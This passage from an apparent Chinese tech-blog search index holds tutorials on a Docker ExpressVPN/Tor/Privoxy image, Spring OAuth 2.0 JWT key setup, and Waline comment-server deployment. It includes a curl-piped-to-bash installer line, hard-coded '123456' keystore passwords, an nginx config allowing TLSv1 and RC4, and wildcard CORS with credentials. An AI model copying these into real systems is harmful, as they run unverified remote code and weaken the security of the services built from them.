/tmp/${APP} \\ &amp;&amp; dpkg -i /tmp/${APP} \\ &amp;&amp; rm -rf /tmp/*.deb \\ &amp;&amp; apt-get purge -y --auto-remove wget \\ &amp;&amp; sed -i \\ -e \'s/#SocksPort 192.168.0.1:9100/SocksPort 0.0.0.0:9050/g\' \\ -e \'s/#ControlPort 9051/ControlPort 9052/g\' \\ /etc/tor/torrc \\ &amp;&amp; sed -i \\ -e \'s/listen-address\\s*127.0.0.1:8118/listen-address 0.0.0.0:8118/g\' \\ /etc/privoxy/config \\ &amp;&amp; curl -s https://install.speedtest.net/app/cli/install.deb.sh | bash \\ &amp;&amp; apt-get install speedtestCOPY entrypoint.sh /tmp/entrypoint.shCOPY expressvpnActivate.sh /tmp/expressvpnActivate.shENTRYPOINT ["/bin/bash", "/tmp/entrypoint.sh"] 使用命令行测试 ExpressVPN 的连接速度： 12345# 测速# docker exec -it expressvpn speedtest# 测速，并指定网速的显示单位# docker exec -it expressvpn speedtest -u kB/s SpeedTest 支持显示的网速单位如下： 1234Decimal prefix, bits per second: bps, kbps, Mbps, GbpsDecimal prefix, bytes per second: B/s, kB/s, MB/s, GB/sBinary prefix, bits per second: kibps, Mibps, GibpsBinary prefix, bytes per second: kiB/s, MiB/s, GiB/s 常见问题ExpressVPN 版本更新若日后希望更新 ExpressVPN 的版本，只需要执行以下两步操作即可： 1）更改 Dockerfile 里 ExpressVPN 安装包的文件名 1234FROM debian:bullseye-slim...ARG APP=expressvpn_3.18.1.0-1_amd64.deb... 2）重新构建 Docker 镜像 1# docker build --pull --no-cache --rm --force-rm -f Dockerfile -t polkaned/privoxy-tor-expressvpn:latest . Chrome 浏览器使用 Privoxy 代理若希望 Chrome 浏览器智能切换至 Docker + ExpressVPN + Privoxy/Tor 提供的代理服务（实现国内外流量分流功能），可以安装 SwitchyOmega 浏览器插件来实现，具体使用方式这里不再累述，更多资料可参考以下链接： Proxy SwitchyOmega 的项目地址 Proxy SwitchyOmega 的 Chrome 应用商店安装地址 构建 Docker 镜像时无法科学上网在上面的教程里，必须保证可以科学上网才能正常构建 Docker 镜像。特殊情况下，可能无法提供科学上网的条件，此时可以通过其他途径手动下载 ExpressVPN 最新版本的 Debian/Ubuntu 安装包，并将安装包重命名为 expressvpn_amd64.deb，然后更改上面的 Dockerfile 的内容（如下所示），这样就可以直接构建 Docker 镜像，不再需要依赖科学上网了。 12345678910111213141516171819202122232425FROM debian:bullseye-slimLABEL maintainer="benjamin@polkaned.net"ENV ACTIVATION_CODE CodeENV LOCATION smartCOPY expressvpn_amd64.deb /tmp/expressvpn_amd64.debRUN dpkg -i /tmp/expressvpn_amd64.deb &amp;&amp; rm -rf /tmp/expressvpn_amd64.debRUN apt-get update &amp;&amp; apt-get install -y --no-install-recommends \\ curl apt-utils apt-transport-https dirmngr ca-certificates expect iproute2 procps libnm0 gnupg2 tor privoxy \\ &amp;&amp; rm -rf /var/lib/apt/lists/* \\ &amp;&amp; sed -i \\ -e \'s/#SocksPort 192.168.0.1:9100/SocksPort 0.0.0.0:9050/g\' \\ -e \'s/#ControlPort 9051/ControlPort 9052/g\' \\ /etc/tor/torrc \\ &amp;&amp; sed -i \\ -e \'s/listen-address\\s*127.0.0.1:8118/listen-address 0.0.0.0:8118/g\' \\ /etc/privoxy/configCOPY entrypoint.sh /tmp/entrypoint.shCOPY expressvpnActivate.sh /tmp/expressvpnActivate.shENTRYPOINT ["/bin/bash", "/tmp/entrypoint.sh"] 参考资料 Tor Privoxy ExpressVPN Dockerfiles Docker 安装 Privoxy 代理服务 Centos7 安装 ExpressVPN 客户端 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"容器化 开发工具"},{title:"Spring Security + OAuth 2.0 + JWT 开发随笔",url:"/posts/894ad1eb.html",text:'JWT 签名与验签公钥与私钥生成使用 JDK 提供的 keytool 工具生成 JKS 密钥库 (Java Key Store)，认证授权服务器会使用私钥对 Token 进行签名，一般将生成的 shop.jks 文件放在 resources 目录下 1keytool -genkey -alias shop -keyalg RSA -keypass 123456 -keystore shop.jks -storepass 123456 根据私钥生成公钥，将其保存在 public.crt 文件中，用于对 Token 进行验签，一般将其放 resources 目录下 1keytool -list -rfc --keystore shop.jks | openssl x509 -inform pem -pubkey -noout 123456789-----BEGIN PUBLIC KEY-----MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAtXKXj3JGNJNWVXg4+++4FtNTJre+8kHLdPLwHJJcRw4aV7oMMjI1nesyj75w/kjRZImhbNo0poEu1jj+sDO9UbLUHSy59zoDDMZTYmbkboDEpkFq3ZUhAoLtt5DtAgI8DkOK22RlSxXpcMvkeL8XziFizWf/HatSgAat/SfX+5dH3KX40piPv9kI5YVJz1GyD8xO4dN95tr0Ld7FDmdKJBPWfkM+CMlKRhYqB+sAlaQW5/L3xb3WNftucC/RhdKT8/mmgMsIBhUZOS/1iFnDKuPsEwU5xEQxK9pWX2bWsSkeOgQYJmQa6hiWBuujPUyOs4rICvniopxsW2yyPOFXZQIDAQAB-----END PUBLIC KEY----- 认证授权服务器加载 JKS 秘钥库认证授权服务器加载 JKS 秘钥库，从中获取密钥对（公钥 + 私钥），Java 示例代码如下： 1234567891011/** * 从ClassPath下的密钥库中获取密钥对（公钥+私钥） * * @return */@Beanpublic KeyPair keyPair() { KeyStoreKeyFactory factory = new KeyStoreKeyFactory(new ClassPathResource("shop.jks"), "123456".toCharArray()); KeyPair keyPair = factory.getKeyPair("shop", "123456".toCharArray()); return keyPair;} 认证授权服务器暴露获取公钥的接口对外暴露 JWK Set URI 接口，让其他应用系统可以获取到公钥 1234567891011121314151617181920@RestController@RequestMapping("/oauth")public class JwkSetController { @Autowired private KeyPair keyPair; /** * 获取公钥 * * @return */ @GetMapping("/.well-known/jwks.json") public Map&lt;String, Object&gt; publicKey() { RSAPublicKey publicKey = (RSAPublicKey) keyPair.getPublic(); RSAKey key = new RSAKey.Builder(publicKey).build(); return new JWKSet(key).toJSONObject(); }} 或者通过 KeyPair 来获取公钥 123456789101112131415161718@RestController@RequestMapping("/oauth")public class PublicKeyController { @Autowired private KeyPair keyPair; /** * 获取公钥 * * @return */ @GetMapping("/publicKey") public String publicKey() { return Base64.encode(new String(keyPair.getPublic().getEncoded())); }} 或者直接使用 OAuth 2.0 内置的接口 /oauth/token_key 来获取公钥 12# 下述的"127.0.0.1:8080"是认证授权服务器的地址$ curl --request GET \'http://127.0.0.1:8080/oauth/token_key 1234{ "alg": "SHA256withRSA", "value": "-----BEGIN PUBLIC KEY-----\\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAtXKXj3JGNJNWVXg4+++4FtNTJre+8kHLdPLwHJJcRw4aV7oMMjI1nesyj75w/kjRZImhbNo0poEu1jj+sDO9p8n5oYXn3qU8bsmqLa/vttq7Ubi4a5eaoP8ASjoD+dnQ0I7ZdpH/fiiHfriGI4tFziFizWf/HatSgAat/SfX+5dk3KX40piPv9kI5YVJz1GyD8xO4dN9dtr0Ld7FDmdKJBPWfkM+CMlKRhYqB+sAlaQW5/L3xb3WNftucC/RhdKT8/mmgMsIBhUZOS/1iFnDKaPsEwU5xEQxK9pWX2bWsSkeOgQYJmQa6hiWBuujPUyOs4rICvniopxsW2yyPOFXZQIDAQAB\\n-----END PUBLIC KEY-----"} 资源服务器指定公钥文件的路径在 YML 配置里指定认证授权服务器暴露的 JWK Set URI 接口，以此来获取公钥，值得一提的是，默认情况下 jwk-set-uri 指定的 URL 无法使用 Ribbon 来实现负载均衡访问（除非利用 DNS 的域名解析，即单个域名绑定多个 IP，通过 DNS 服务器做负载均衡） 12345678spring: application: name: gateway-server security: oauth2: resourceserver: jwt: jwk-set-uri: http://127.0.0.1:8080/oauth/.well-known/jwks.json 或者将上面通过 keytool 工具获取到的公钥拷贝到 src/main/resources/public.crt 文件中，然后在 YML 配置里指定公钥文件的路径 12345678spring: application: name: gateway-server security: oauth2: resourceserver: jwt: public-key-location: classpath:public.crt Cannot convert access token to JSON 错误应用启动后，出现 Cannot convert access token to JSON 这个错误，主要是 OAuth 2.0 的资源服务器缺少了加载公钥的配置，解决方法如下： 123456789@Beanpublic JwtAccessTokenConverter accessTokenConverter() { JwtAccessTokenConverter converter = new JwtAccessTokenConverter(); // 获取公钥 String publicKey = getPublicKey(); // 加载公钥 converter.setVerifier(new RsaVerifier(publicKey)); return converter;} 资源服务器加载公钥的完整示例代码如下： 1234567891011121314151617181920212223242526 &lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;fastjson&lt;/artifactId&gt; &lt;version&gt;1.2.75&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;xom&lt;/groupId&gt; &lt;artifactId&gt;xom&lt;/artifactId&gt; &lt;version&gt;1.3.7&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.jdom&lt;/groupId&gt; &lt;artifactId&gt;jdom&lt;/artifactId&gt; &lt;version&gt;2.0.2&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;net.sf.json-lib&lt;/groupId&gt; &lt;artifactId&gt;json-lib&lt;/artifactId&gt; &lt;version&gt;2.1&lt;/version&gt; &lt;classifier&gt;jdk15&lt;/classifier&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;cn.hutool&lt;/groupId&gt; &lt;artifactId&gt;hutool-all&lt;/artifactId&gt; &lt;version&gt;5.5.8&lt;/version&gt;&lt;/dependency&gt; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124import cn.hutool.core.io.FileUtil;import cn.hutool.core.util.StrUtil;import com.alibaba.fastjson.JSONObject;import net.sf.json.xml.XMLSerializer;import org.slf4j.Logger;import org.slf4j.LoggerFactory;import org.springframework.beans.factory.annotation.Value;import org.springframework.boot.autoconfigure.security.oauth2.resource.OAuth2ResourceServerProperties;import org.springframework.context.annotation.Bean;import org.springframework.context.annotation.Configuration;import org.springframework.core.io.ClassPathResource;import org.springframework.core.io.Resource;import org.springframework.security.jwt.crypto.sign.RsaVerifier;import org.springframework.security.oauth2.provider.token.TokenStore;import org.springframework.security.oauth2.provider.token.store.JwtAccessTokenConverter;import org.springframework.security.oauth2.provider.token.store.JwtTokenStore;import org.springframework.web.client.RestTemplate;import java.io.BufferedReader;import java.io.InputStreamReader;import java.util.stream.Collectors;/** * OAuth2.0认证的Token配置 */@Configurationpublic class OAuthTokenConfig { /** * 获取公钥的接口地址 */ @Value("${spring.security.oauth2.resourceserver.jwt.key-set-uri:}") private String keySetUri; private OAuth2ResourceServerProperties resourceServerProperties; private static final Logger logger = LoggerFactory.getLogger(OAuthTokenConfig.class); public OAuthTokenConfig(OAuth2ResourceServerProperties resourceServerProperties) { this.resourceServerProperties = resourceServerProperties; } @Bean public TokenStore tokenStore() { return new JwtTokenStore(accessTokenConverter()); } @Bean public JwtAccessTokenConverter accessTokenConverter() { JwtAccessTokenConverter converter = new JwtAccessTokenConverter(); String publicKey = getPublicKey(); converter.setVerifier(new RsaVerifier(publicKey)); logger.info("success to load public key"); return converter; } /** * 通过读取本地文件获取非对称加密公钥 * * @return 公钥 */ private String getPublicKey() { if (StrUtil.isBlank(keySetUri)) { return getKeyFromLocal(); } else { return getKeyFromAuthorizationServer(); } } /** * 通过访问授权服务器获取非对称加密公钥&lt;br&gt; * 这里可以直接使用OAuth2.0内置的接口来获取公钥，Key Set Uri 地址配置示例： http://127.0.0.1:8080/oauth/token_key * * @return 公钥 */ private String getKeyFromAuthorizationServer() { try { XMLSerializer xmlSerializer = new XMLSerializer(); String xmlPubKey = new RestTemplate().getForObject(keySetUri, String.class); String jsonPubKey = xmlSerializer.read(xmlPubKey).toString(); JSONObject json = JSONObject.parseObject(jsonPubKey); return json.get("value").toString(); } catch (Exception e) { logger.error("failed to load public key from authorization server: {}", e.getLocalizedMessage()); } return null; } /** * 获取本地的公钥 * * @return */ private String getKeyFromLocal() { Resource resource = getPublicKeyFile(); try (BufferedReader br = new BufferedReader(new InputStreamReader(resource.getInputStream()))) { return br.lines().collect(Collectors.joining("\\n")); } catch (Exception e) { logger.error("failed to load public key from local: {}", e.getLocalizedMessage()); } return null; } /** * 获取本地的公钥文件 * * @return */ private Resource getPublicKeyFile() { try { // 读取YML配置里指定的本地公钥文件，对应的YML配置如下： // spring.security.oauth2.resourceserver.jwt.public-key-location=public.crt Resource resource = resourceServerProperties.getJwt().getPublicKeyLocation(); if (FileUtil.exist(resource.getFile())) { return resource; } } catch (Exception e) { logger.error("failed to read public key file from local: {}", e.getLocalizedMessage()); } // 读取默认路径下的本地公钥文件 return new ClassPathResource("public.crt"); }} 123456789spring: application: name: provider-service security: oauth2: resourceserver: jwt: # public-key-location: classpath:public.crt # 加载本地的公钥文件 key-set-uri: http://127.0.0.1:8080/oauth/token_key # 从认证授权服务器获取公钥 特别注意：在上述代码中，若在 YML 文件里配置了从认证授权服务器获取公钥，那么必须使用 OAuth 2.0 内置的接口 /oauth/token_key 来获取公钥，同时使用的配置项是 key-set-uri，而不再是 jwk-set-uri OAuth 2.0 资源服务器资源服务器鉴权配置默认情况下，OAuth 2.0 的权限是从 Client 的 scope 中获取，示例代码如下： 123456789101112131415161718192021222324252627282930313233/** * 资源服务器配置 */@Configuration@EnableResourceServerpublic class OAuthResouceServer extends ResourceServerConfigurerAdapter { @Autowired private TokenStore tokenStore; /** * 资源配置 */ @Override public void configure(ResourceServerSecurityConfigurer resources) { resources.resourceId("school") .tokenStore(tokenStore) .stateless(true) .accessDeniedHandler(new CustomAccessDeniedHandler()); } /** * 对HTTP请求鉴权 */ @Override public void configure(HttpSecurity http) throws Exception { http.authorizeRequests() .antMatchers("/**").access("#oauth2.hasScope(\'teacher\')") .and().csrf().disable() .sessionManagement().sessionCreationPolicy(SessionCreationPolicy.STATELESS); }} 若权限存在于 authorities 中，需要替代 OAuth2ResourceServerWebSecurityConfiguration 的配置，示例代码如下： 弃用方法安全 通过自定义 Converter 来指定权限，Converter 是函数接口，当前上下问参数为 JWT 对象 获取 JWT 中的 authorities 12345678910111213141516171819@EnableGlobalMethodSecurity(prePostEnabled = true)@EnableWebSecuritypublic class WebSecurityConfig extends WebSecurityConfigurerAdapter { @Override protected void configure(HttpSecurity http) throws Exception { http.authorizeRequests() .anyRequest().authenticated() .and() .oauth2ResourceServer().jwt().jwtAuthenticationConverter(jwt -&gt; { Collection&lt;SimpleGrantedAuthority&gt; authorities = ((Collection&lt;String&gt;) jwt.getClaims() .get("authorities")).stream() .map(SimpleGrantedAuthority::new) .collect(Collectors.toSet()); return new JwtAuthenticationToken(jwt, authorities); }); }} 参考博客 Spring Security + OAuth 2.0 之 Resource Server（基于 JWT） 在 Spring Boot 的 YML 配置中使用 jwt.key-uri 替换 jwk.key-set-uri Spring Security Oauth2 添加自定义过滤器和 Oauth2 认证后 API 权限控制 Spring Cloud Oauth2 - Cannot convert access token to JSON 错误解决方法 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"微服务 开发随笔 oauth"},{title:"Hexo Next 主题使用 Waline 评论系统",url:"/posts/ae18fb85.html",text:'前言本教程的内容虽然会持续更新，但一切内容以 Waline 官方文档 为准。 版本说明 软件 版本 描述 linux CentOS 7.9 docker 20.10.5 mysql 5.7.26 node 14.17.3 hexo 5.4.0 next 8.12.1 waline-admin 0.18.0 waline-client 2.5.1 waline-server 1.18.5 Hexo 评论系统选择Hexo 各类评论系统的对比可看这里，之前博客一直使用的评论系统是基于 Github Issue 的 Utterances。由于 Utterances 默认没有 CDN 加速，经常造成页面加载完成后无法正常显示 Utterances 的评论区，而且需用用户登录 Github 账号才能评论，因此打算更换博客的评论系统。国外的 Disqus、Hypercomments 暂时不考虑，国内访问被墙的概率很大。Gitment、Gitalk、Gitter 和 Utterances 一样，访问速度不太稳定，且登录 Github 才能评论，暂时也不考虑。这一波排除下来，剩下的方案只有 Valine、Isso、Waline 或者 自建评论系统。考虑到 Valine 依赖 Leancloud 第三方服务，且需要在 Leancloud 额外部署 Valine Admin 才能实现邮件通知与评论管理等功能，这样一来感觉也不靠谱，万一 Leancloud 以后退出商业市场竞争呢？综合考虑下来，最终选择了 Waline 评论系统，一款从 Valine 衍生的带后端评论系统，支持多种部署方式和数据存储方式，这样就可以省去 自建评论系统 的开发成本，同时也可以尽量少依赖第三方服务，增加日后扩展和维护的自由度。 Hexo 评论系统介绍Valine 评论系统Valine 是一款基于 Leancloud 的快速、简洁且高效的无后端评论系统，用户无需登录即可评论，目前已有 Hexo、Jekyll、Typecho、Hugo、Ghost 等博客程序在使用。由于 Valine 自身不支持邮件通知支持，因此诞生了 Valine Admin 开源项目；一个对 Valine 评论系统的拓展应用，可增强 Valine 的邮件通知功能；基于 Leancloud 的云引擎与云函数，主要实现评论邮件通知、评论管理、自定义邮件通知模板等功能，而且还可以提供邮件 通知博主 和 @ 通知 的功能。 Waline 评论系统Waline 一款从 Valine 衍生的带后端评论系统，可以将 Waline 等价成 With backend Valine，采用 Client/Server 架构并基于 NodeJS 开发。Valine 支持 MarkDown 语法、邮件通知、评论管理、多种部署方式、多种数据存储方式。 Waline 客户端脚本 服务端部署 数据存储 @waline/client Vercel LeanCloud MiniValine CloudBase CloudBase Docker MongoDB 独立部署 MySQL SQLite PostgreSQL Github Waline 支持的功能： 邮件通知 微信通知 QQ 通知 Telegram 通知 Akismet 反垃圾评论 文章统计 多语言 自定义语言支持 登录支持 评论管理 评论删除 其它数据库服务支持（已支持 LeanCloud, MySQL, MongoDB, SQLite, PostgreSQL) 基于 IP 的评论发布频率限制 基于关键词的评论过滤限制 IP 黑名单 重复内容检测 CloudBase 腾讯云开发部署支持 社交登录 AWS, GCP, Azure 部署支持 置顶评论 评论赞踩 Docker 部署 MySQL Server使用 Docker 部署 MySQL，容器管理工具使用 Docker-Compose。 Doker 部署 MySQL在下述的 Docker-Compose 配置里，指定了 MySQL 容器的静态 IP 地址与系统时区，yourPassword 为数据库密码，/usr/local/docker-volumes/mysql/* 是 MySQL 容器各个数据卷目录的路径 1234567891011121314151617181920212223242526272829version: "3.5"services: mysql: image: mysql:5.7.26 container_name: waline-mysql restart: always privileged: false environment: TZ: \'Asia/Shanghai\' MYSQL_ROOT_PASSWORD: yourPassword ports: - 3306:3306 networks: waline-network: ipv4_address: 172.23.0.3 volumes: - \'/usr/local/docker-volumes/mysql/conf:/etc/mysql/conf.d\' - \'/usr/local/docker-volumes/mysql/data:/var/lib/mysql\' - \'/usr/local/docker-volumes/mysql/log:/var/log/mysql\' command: --default-authentication-plugin=mysql_native_passwordnetworks: waline-network: name: waline-network driver: bridge ipam: config: - subnet: 172.23.0.0/24 MySQL 数据库表初始化创建并启动 MySQL 的 Docker 容器后，导入最新的 waline.sql 脚本来创建好 Waline Server 所需的数据库表，其中相关表的结构如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152CREATE DATABASE waline DEFAULT CHARACTER SET utf8mb4;CREATE TABLE `wl_Comment` ( `id` int(11) unsigned NOT NULL AUTO_INCREMENT, `user_id` int(11) DEFAULT NULL, `comment` text, `insertedAt` timestamp NULL DEFAULT CURRENT_TIMESTAMP, `ip` varchar(100) DEFAULT \'\', `link` varchar(255) DEFAULT NULL, `mail` varchar(255) DEFAULT NULL, `nick` varchar(255) DEFAULT NULL, `pid` int(11) DEFAULT NULL, `rid` int(11) DEFAULT NULL, `sticky` boolean DEFAULT NULL, `status` varchar(50) NOT NULL DEFAULT \'\', `like` int(11) DEFAULT NULL, `ua` text, `url` varchar(255) DEFAULT NULL, `createdAt` timestamp NULL DEFAULT CURRENT_TIMESTAMP, `updatedAt` timestamp NULL DEFAULT CURRENT_TIMESTAMP, PRIMARY KEY (`id`)) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;CREATE TABLE `wl_Counter` ( `id` int(11) unsigned NOT NULL AUTO_INCREMENT, `time` int(11) DEFAULT NULL, `url` varchar(255) NOT NULL DEFAULT \'\', `createdAt` timestamp NULL DEFAULT CURRENT_TIMESTAMP, `updatedAt` timestamp NULL DEFAULT CURRENT_TIMESTAMP, PRIMARY KEY (`id`)) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;CREATE TABLE `wl_Users` ( `id` int(11) unsigned NOT NULL AUTO_INCREMENT, `display_name` varchar(255) NOT NULL DEFAULT \'\', `email` varchar(255) NOT NULL DEFAULT \'\', `password` varchar(255) NOT NULL DEFAULT \'\', `type` varchar(50) NOT NULL DEFAULT \'\', `label` varchar(255) DEFAULT NULL, `url` varchar(255) DEFAULT NULL, `avatar` varchar(255) DEFAULT NULL, `github` varchar(255) DEFAULT NULL, `twitter` varchar(255) DEFAULT NULL, `facebook` varchar(255) DEFAULT NULL, `google` varchar(255) DEFAULT NULL, `weibo` varchar(255) DEFAULT NULL, `qq` varchar(255) DEFAULT NULL, `2fa` varchar(32) DEFAULT NULL, `createdAt` timestamp NULL DEFAULT CURRENT_TIMESTAMP, `updatedAt` timestamp NULL DEFAULT CURRENT_TIMESTAMP, PRIMARY KEY (`id`)) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4; Docker 部署 Waline Server使用 Docker 部署 Waline Server，数据存储方式选择 MySQL，容器管理工具使用 Docker-Compose。 构建 Waline Server 镜像若不希望自己构建 Waline Server 的 Docker 镜像，可以直接使用 Waline 官方的 Docker 镜像，操作步骤如下： 12345678# 拉取最新的代码# git clone https://github.com/lizheming/waline.git# 进入代码目录# cd waline/packages/server/# 构建镜像# docker build -t lizheming/waline -f Dockerfile . 值得一提的是，官方提供的 Dockerfile 默认会使用最新的 Waline Server 代码来构建 Docker 镜像，若希望使用本地的 Waline Server 代码（经过更改的）来构建 Docker 镜像，需要自行更改 Dockerfile 的内容（如下所示）；为了统一使用东八区时区，建议更改系统默认的时区。 12345678910111213141516171819# https://github.com/nodejs/LTSFROM node:lts AS buildWORKDIR /appENV NODE_ENV productionRUN set -eux; \\ # npm config set registry https://registry.npmmirror.com; \\ npm install --production --silent @waline/vercel# use local source codeRUN rm -rf /app/node_modules/@waline/vercel/src/*COPY ./src/ /app/node_modules/@waline/vercel/srcFROM node:lts-buster-slimWORKDIR /appRUN ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtimeENV TZ Asia/ShanghaiENV NODE_ENV productionCOPY --from=build /app .EXPOSE 8360CMD ["node", "node_modules/@waline/vercel/vanilla.js"] 提示 若构建 Waline Server 的 Docker 镜像时，一直卡在 NPM 安装模块的过程里，可以更改对应的 Dockerfile（如下所示），使用淘宝的 NPM 源来加速 NPM 模块下载 123456$ vim waline/packages/server/Dockerfile...（省略）npm config set registry https://registry.npmmirror.com; \\npm install --production --silent @waline/vercel...（省略） Docker 部署 Waline Server在上面 MySQL 的 Docker-Compose 配置基础上，指定 Waline Server 容器的静态 IP 地址 与 Waline Server 启动时所需的环境变量 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758version: "3.5"services: mysql: image: mysql:5.7.26 container_name: waline-mysql restart: always privileged: false environment: TZ: \'Asia/Shanghai\' MYSQL_ROOT_PASSWORD: yourPassword ports: - 3306:3306 networks: waline-network: ipv4_address: 172.23.0.3 volumes: - \'/usr/local/docker-volumes/mysql/conf:/etc/mysql/conf.d\' - \'/usr/local/docker-volumes/mysql/data:/var/lib/mysql\' - \'/usr/local/docker-volumes/mysql/log:/var/log/mysql\' command: --default-authentication-plugin=mysql_native_password waline: container_name: waline image: lizheming/waline:latest restart: always privileged: false depends_on: - mysql ports: - 8360:8360 networks: waline-network: ipv4_address: 172.23.0.4 environment: TZ: "Asia/Shanghai" AKISMET_KEY: "false" DISABLE_USERAGENT: "true" SITE_NAME: "Your site name" SECURE_DOMAINS: "example.cn" AUTHOR_EMAIL: "example@qq.com" SITE_URL: "https://www.example.cn" MYSQL_HOST: 172.23.0.3 MYSQL_PORT: 3306 MYSQL_DB: waline MYSQL_PREFIX: wl_ MYSQL_USER: root MYSQL_PASSWORD: yourPassword volumes: - /usr/local/waline/data:/app/datanetworks: waline-network: name: waline-network driver: bridge ipam: config: - subnet: 172.89.0.0/24 Waline Server 的环境变量Waline Server 的 自身环境变量如下： 环境变量名称 必填 默认值 备注 TZ 时区 SITE_URL 站点 URL SITE_NAME 站点名称 AUTHOR_EMAIL 博主邮箱 SECURE_DOMAINS 安全域名配置，支持逗号分隔配置多个域名，配置后非该域名来源的请求会返回 403 状态码，不配置表示允许所有域名来源 IPQPS 60 基于 IP 的评论发布频率限制，单位为秒。默认为 60 秒，设置为 0 不限制 DISABLE_USERAGENT false 是否隐藏评论者的 UA，默认为否 DISABLE_REGION false 是否隐藏评论者的归属地，默认为否 DISABLE_AUTHOR_NOTIFY false 是否禁止新评论通知，默认为否 COMMENT_AUDIT 评论发布审核开关，默认为否，配置后建议在 Placehoder 上提供文案提示 AKISMET_KEY Akismet 反垃圾评论服务的 Key（默认开启，不用请设置为 false，关闭后可以加快评论提交的速度） AVATAR_PROXY https://avatar.75cdn.workers.dev/ 头像的代理地址，设置 false 可以关闭代理 LOGIN 当设置为 LOGIN: \'force\' 时，服务端会要求客户端必须登录才能评论；同时 Waline 客户端需要增加 login： force 的配置用于隐藏博客页面上的评论匿名输入框 GRAVATAR_STR https://seccdn.libravatar.org/avatar/{{mail|md5}} Gravatar 头像的地址，基于 Nunjucks 语法 OAUTH_URL https://user.75.team OAuth 第三方登录服务地址，也可以使用 auth 自建 WEBHOOK 评论成功后会向 WEBHOOK 配置的地址发送一条 POST 请求 COMMENT_AUDIT：阅读源代码发现，环境变量中不配置 COMMENT_AUDIT，则默认关闭评论发布的审核功能，只要在环境变量中添加了该属性，无论属性值是什么，都会开启评论发布的审核功能 Waline Server 的 MySQL 环境变量如下： 环境变量名称 必填 默认值 备注 MYSQL_HOST 127.0.0.1 MySQL 服务的地址 MYSQL_PORT 3306 MySQL 服务的端口 MYSQL_DB ✓ MySQL 数据库库名 MYSQL_USER ✓ MySQL 数据库的用户名 MYSQL_PASSWORD ✓ MySQL 数据库的密码 MYSQL_PREFIX wl_ MySQL 数据表的表前缀 MYSQL_CHARSET utf8mb4 MySQL 数据表的字符集 Waline Server 运行测试分别创建并启动 MySQL 与 Waline Server 容器，然后浏览器访问 http://ip:port/ui/register，打开 Waline Server 的 Web 管理界面进行注册，第一个注册的用户会被 Waline Server 识别为系统管理员（博主），成功登录后的界面如下： 若 Waline Server 的 Web 管理界面无法正常访问，可以使用以下命令查看 Docker 容器的日志来定位问题 1# docker logs -f --tail 20 waline Waline Server 配置反向代理Nginx 反向代理配置若使用 Nginx 作为 Waline Server 的反向代理，可参考以下配置内容。 12345678910111213141516171819202122232425262728293031323334353637server { listen 80; listen 443 ssl; server_name www.example.com if ($server_port !~ 443){ rewrite ^(/.*)$ https://$host$1 permanent; } # SSL 证书 ssl_certificate /usr/local/nginx/cert/waline.example.com.crt; ssl_certificate_key /usr/local/nginx/cert/waline.example.com.key; # SSL 性能调优 ssl_session_timeout 10m; ssl_prefer_server_ciphers on; ssl_session_cache shared:SSL:10m; ssl_protocols TLSv1 TLSv1.1 TLSv1.2 TLSv1.3; ssl_ciphers ECDHE-RSA-AES256-SHA384:AES256-SHA256:RC4:HIGH:!MD5:!aNULL:!eNULL:!NULL:!DH:!EDH:!AESGCM; add_header Strict-Transport-Security \'max-age=31536000\'; location / { # 反向代理 proxy_pass http://$server_name; proxy_set_header Host $host:$server_port; proxy_set_header X-NginX-Proxy true; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme; proxy_set_header REMOTE-HOST $remote_addr; # 缓存 add_header X-Cache $upstream_cache_status; add_header Cache-Control no-cache; expires 12h; }} Nginx 配置跨域访问默认情况下，当在 Waline 服务端的环境变量里添加了 SITE_URL 属性，那么 Nginx 的反向代理不再需要配置跨域，因为 Waline Server 会自动将 SITE_URL 添加到允许跨域的名单里。若 Waline Server 自带的跨域配置不能满足要求，可以参考以下内容自行配置 Nginx 的跨域。 123456789101112131415161718192021222324252627location /comment { # 清除Waline自带的跨域Header proxy_hide_header Access-Control-Allow-Origin; proxy_hide_header Access-Control-Allow-Methods; proxy_hide_header Access-Control-Allow-Headers; proxy_hide_header Access-Control-Allow-Credentials; # 添加自定义的跨域Header add_header \'Access-Control-Allow-Origin\' \'*\' always; add_header \'Access-Control-Allow-Credentials\' \'true\' 